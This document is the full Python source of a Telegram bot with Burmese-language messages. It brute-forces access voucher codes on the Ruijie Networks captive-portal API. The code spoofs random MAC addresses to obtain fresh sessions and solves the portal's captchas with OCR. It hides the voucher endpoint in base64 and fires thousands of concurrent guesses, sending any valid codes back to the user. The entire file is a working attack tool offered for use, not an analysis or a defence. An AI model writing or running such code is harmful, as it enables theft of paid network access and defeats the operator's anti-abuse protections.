import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, concurrent.futures
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timezone

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
REPO_OWNER = os.environ.get("REPO_OWNER", "")
REPO_NAME = os.environ.get("REPO_NAME", "")

bot = AsyncTeleBot(BOT_TOKEN)
_telegram_send = bot.send_message
_telegram_reply = bot.reply_to
_telegram_edit = bot.edit_message_text
user_data = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
retry_counts = {}
_session_pool = {}

session = None
_connector = None
_voucher_sem = None
_start_time = time.monotonic()

SESSION_POOL_LIMIT = 60
SESSION_POOL_SLOTS = 5
CONCURRENCY = 2500
BATCH_SIZE = 5000

async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"Web server started on port {port}")

async def rebuild_session():
    global session, _connector
    if session and not session.closed:
        await session.close()
    if _connector and not _connector.closed:
        await _connector.close()
    timeout = aiohttp.ClientTimeout(total=30)
    _connector = aiohttp.TCPConnector(limit=6000, ttl_dns_cache=300, ssl=False)
    session = aiohttp.ClientSession(
        timeout=timeout,
        connector=_connector,
        connector_owner=False
    )

TELEGRAM_MESSAGE_LIMIT = 3900
TELEGRAM_RETRY_LIMIT = 3

def split_telegram_message(text, max_chars=TELEGRAM_MESSAGE_LIMIT):
    if len(text) <= max_chars:
        return [text]
    chunks = []
    remaining = text
    while remaining:
        cut = min(max_chars, len(remaining))
        if cut < len(remaining):
            newline = remaining.rfind("\n", 0, cut)
            if newline > 0:
                cut = newline
        chunks.append(remaining[:cut].rstrip())
        remaining = remaining[cut:].lstrip()
    return chunks

async def safe_send_message(chat_id, text, **kwargs):
    for attempt in range(TELEGRAM_RETRY_LIMIT):
        try:
            return await _telegram_send(chat_id, text, **kwargs)
        except (asyncio.TimeoutError, aiohttp.ClientError) as error:
            if attempt == TELEGRAM_RETRY_LIMIT - 1:
                raise
            await asyncio.sleep(1 + attempt)

async def safe_reply_to(message, text, **kwargs):
    for attempt in range(TELEGRAM_RETRY_LIMIT):
        try:
            return await _telegram_reply(message, text, **kwargs)
        except (asyncio.TimeoutError, aiohttp.ClientError) as error:
            if attempt == TELEGRAM_RETRY_LIMIT - 1:
                raise
            await asyncio.sleep(1 + attempt)

async def safe_edit_message_text(chat_id, message_id, text, **kwargs):
    for attempt in range(TELEGRAM_RETRY_LIMIT):
        try:
            return await _telegram_edit(
                chat_id=chat_id,
                message_id=message_id,
                text=text,
                **kwargs
            )
        except (asyncio.TimeoutError, aiohttp.ClientError) as error:
            if attempt == TELEGRAM_RETRY_LIMIT - 1:
                raise
            await asyncio.sleep(1 + attempt)

bot.send_message = safe_send_message
bot.reply_to = safe_reply_to
bot.edit_message_text = safe_edit_message_text

@bot.message_handler(commands=['start'])
async def start(message):
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("🚀 စကန်ဖတ်ရန် (Scan)", callback_data="btn_scan_help"),
        InlineKeyboardButton("📌 အကူအညီ (Help)", callback_data="btn_help")
    )
    markup.add(
        InlineKeyboardButton("⚙️ အခြေအနေ (Status)", callback_data="btn_status"),
        InlineKeyboardButton("🛑 ရပ်ရန် (Stop)", callback_data="btn_stop")
    )
    await bot.reply_to(
        message,
        "✨ <b>Ruijie Voucher Bot</b> မှ ကြိုဆိုပါတယ် ဗျာ! ⚡\n\n"
        "အောက်ပါခလုတ်များကို အသုံးပြု၍ စီမံနိုင်ပါသည် 👇",
        reply_markup=markup,
        parse_mode="HTML"
    )

@bot.callback_query_handler(func=lambda call: True)
async def callback_query(call):
    chat_id = call.message.chat.id
    data = call.data
    if data == "btn_scan_help":
        await bot.answer_callback_query(call.id, "💡 ညွှန်ကြားချက်: /input <url> ဖြင့် အရင်ချိတ်ပါ")
        await bot.send_message(chat_id, "📌 <b>အသုံးပြုပုံ</b>:\n၁။ <code>/input your_url</code> ဖြင့် Session URL ထည့်ပါ\n၂။ <code>/scan 6</code> (သို့) <code>/scan all</code> ဖြင့် စတင်ပါ", parse_mode="HTML")
    elif data == "btn_help":
        await bot.answer_callback_query(call.id, "ℹ️ အကူအညီ မီနူး")
        await bot.send_message(chat_id, "📖 <b>Commands:</b>\n/input - URL ထည့်ရန်\n/scan - ကုဒ်စကန်ရန်\n/stop - ရပ်တန့်ရန်", parse_mode="HTML")
    elif data == "btn_status":
        active = "အလုပ်လုပ်နေသည် 🟢" if chat_id in scan_tasks else "ရပ်နားထားသည် 🔴"
        await bot.answer_callback_query(call.id, f"📊 အခြေအနေ: {active}")
        await bot.send_message(chat_id, f"📊 <b>လက်ရှိ Bot အခြေအနေ:</b>\n• Status: {active}\n• Active Scans: {len(scan_tasks)}", parse_mode="HTML")
    elif data == "btn_stop":
        await bot.answer_callback_query(call.id, "🛑 စကန်ဖတ်မှုကို ရပ်လိုက်ပါပြီ")
        data_task = scan_tasks.get(chat_id)
        if data_task and not data_task["task"].done():
            data_task["stop"] = True
            data_task["task"].cancel()
            scan_tasks.pop(chat_id, None)
            await bot.send_message(chat_id, "✅ စကန်ဖတ်ခြင်း အောင်မြင်စွာ ရပ်သွားပါပြီ။")
        else:
            await bot.send_message(chat_id, "⚠️ လက်ရှိ စကန်ဖတ်နေခြင်း မရှိပါ။")

async def check_session_url(session_url):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    try:
        async with session.get(session_url, allow_redirects=True, headers=headers) as response:
            final_url = str(response.url)
            body = await response.text()
            return "sessionId" in final_url or "sessionId" in body or response.status in (200, 302, 301)
    except Exception:
        return False

@bot.message_handler(commands=['input'])
async def handle_input(message):
    chat_id = message.chat.id
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "⚠️ <b>Usage:</b> <code>/input your_session_url</code>", parse_mode="HTML")
        return
    url = args[1]
    user_data.setdefault(chat_id, {})
    await bot.reply_to(message, "🔄 Session URL အား စစ်ဆေးနေပါပြီ ⏳...")
    if await check_session_url(session_url=url):
        user_data[chat_id]['session_url'] = url
        await bot.reply_to(message, "✅ Session URL အောင်မြင်စွာ သိမ်းဆည်းပြီးပါပြီ 🎉! /scan ဖြင့် စတင်နိုင်ပါပြီ။")
    else:
        await bot.reply_to(message, "❌ Session URL မှားယွင်းနေပါသည် သို့မဟုတ် သက်တမ်းကုန်သွားပါပြီ။")

@bot.message_handler(commands=['scan'])
async def scan(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "⚠️ <b>Usage:</b> <code>/scan [6, 7, 8, ascii-lower, all]</code>", parse_mode="HTML")
        return
    mode = args[1]
    chat_id = message.chat.id
    if mode not in {"6", "7", "8", "all", "ascii-lower"}:
        await bot.reply_to(message, "❌ Mode သည် 6, 7, 8, all, ascii-lower ထဲမှ တစ်ခုဖြစ်ရပါမည်။")
        return
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "⚠️ ပထမဦးစွာ <code>/input</code> ဖြင့် Session URL ထည့်သွင်းပေးပါရန်။", parse_mode="HTML")
        return

    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        await bot.reply_to(message, "⚠️ စကန်ဖတ်ခြင်း လုပ်ငန်းစဉ်သည် လက်ရှိတွင် အလုပ်လုပ်နေဆဲ ဖြစ်ပါသည်။")
        return

    progress_msg = await safe_send_message(chat_id, "🔍 စကန်ဖတ်ခြင်း စတင်နေပါပြီ ⚡...")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id, message=message, progress_msg=progress_msg)
    )

    scan_tasks[chat_id] = {
        "task": task, "stop": False, "scan_id": scan_id,
        "checked": 0, "total": None, "speed": 0, "found": 0,
        "retries": 0, "start_time": time.monotonic(), "mode": mode
    }

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["task"].cancel()
        scan_tasks.pop(chat_id, None)
        await bot.reply_to(message, "🛑 စကန်ဖတ်ခြင်း လုပ်ငန်းစဉ်ကို ရပ်တန့်လိုက်ပါပြီ။")
    else:
        await bot.reply_to(message, "⚠️ လက်ရှိ လုပ်ဆောင်နေသော စကန်ဖတ်မှု မရှိပါ။")

def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

def all_generator(length=6):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))

def ascii_generator(length=6):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(length))

def iter_codes(mode):
    if mode in ["6", "7"]:
        length = int(mode)
        total = 10 ** length
        start = random.randrange(total)
        step = random.randrange(1, total, 2)
        while step % 5 == 0:
            step = random.randrange(1, total, 2)
        for offset in range(total):
            yield str((start + offset * step) % total).zfill(length)
        return
    if mode == "8":
        while True:
            yield digit_generator(8)
    if mode == "ascii-lower":
        while True:
            yield ascii_generator(6)
    if mode == "all":
        while True:
            yield all_generator(6)
    raise ValueError("Unsupported mode")

def format_progress(checked, total=None, speed=0, found=0, retries=0):
    speed_str = f"{speed:,.0f} codes/min"
    if total is not None:
        percent = (checked / total) * 100
        filled = min(20, int(percent / 5))
        bar = "█" * filled + "░" * (20 - filled)
        return f"🔍 <b>Scanning...</b> 🔄\n\n📦 Checked: {checked:,}/{total:,}\n📊 Progress: {percent:.2f}%\n⚡ Speed: {speed_str}\n✅ Found: {found}\n🔁 Retries: {retries}\n[{bar}]"
    return f"🔍 <b>Scanning...</b> 🔄\n\n📦 Checked: {checked:,}\n⚡ Speed: {speed_str}\n✅ Found: {found}\n🔁 Retries: {retries}\n📊 Status: Running 🟢"

async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None):
    try:
        code_iter = iter_codes(mode)
    except Exception:
        return
    total = 10 ** int(mode) if mode in ["6", "7"] else None
    checked = 0
    scan_start = time.monotonic()
    global _voucher_sem
    _voucher_sem = asyncio.Semaphore(CONCURRENCY)
    pending = set()

    async def _check(code):
        async with _voucher_sem:
            return await perform_check(session_url, code, chat_id, scan_id, message=message)

    try:
        for code in code_iter:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("stop"):
                break
            t = asyncio.create_task(_check(code))
            pending.add(t)
            t.add_done_callback(pending.discard)
            if len(pending) >= CONCURRENCY:
                done, _ = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
                checked += len(done)
        while pending:
            done, _ = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
            checked += len(done)
    finally:
        for t in pending:
            t.cancel()
        scan_tasks.pop(chat_id, None)

async def get_session_id(session, session_url, previous_session_id=None):
    mac = ':'.join(f'{random.choice([0x02, 0x06, 0x0A, 0x0E]):02x}' for _ in range(1)) + ''.join(f':{random.randint(0,255):02x}' for _ in range(5))
    session_url = re.sub(r'(?<=mac=)[^&]+', mac, session_url)
    try:
        async with session.get(session_url, allow_redirects=True) as req:
            match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
            return match.group(1) if match else previous_session_id
    except Exception:
        return previous_session_id

async def perform_check(session_url, code, chat_id, scan_id=None, message=None):
    post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
    response = None
    for _attempt in range(3):
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=aiohttp.ClientTimeout(total=30)) as task_session:
            session_id = await get_session_id(task_session, session_url)
            if not session_id:
                return
            try:
                img = await task_session.get(f'https://portal-as.ruijienetworks.com/api/auth/captcha/image?sessionId={session_id}&_t={time.time()}')
                img_bytes = await img.read()
                ocr_text = _ocr.classification(img_bytes).upper()
                verify = await task_session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', json={'sessionId': session_id, 'authCode': ocr_text})
                v_data = await verify.json()
                if not v_data.get("success"):
                    continue
                async with task_session.post(post_url, json={"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": ocr_text}) as req:
                    response = await req.text()
                    if req.status in (401, 403):
                        return
            except Exception:
                return
        break
    if response and 'logonUrl' in response:
        if chat_id not in success_texts:
            success_texts[chat_id] = []
        success_texts[chat_id].append(f"🎫 <code>{code}</code>")
        if message:
            try:
                await safe_send_message(message.chat.id, f"🎉 <b>Success Code Found!</b>\n\n🎫 Code: <code>{code}</code>", parse_mode="HTML")
            except Exception:
                pass

_ocr = ddddocr.DdddOcr(show_ad=False)

async def start_polling():
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=35)
        except Exception as e:
            await asyncio.sleep(5)

async def main():
    global _connector
    _connector = aiohttp.TCPConnector(limit=6000, ssl=False)
    global session
    session = aiohttp.ClientSession(connector=_connector, connector_owner=False)
    await asyncio.gather(web_server(), start_polling())

if __name__ == '__main__':
    asyncio.run(main())
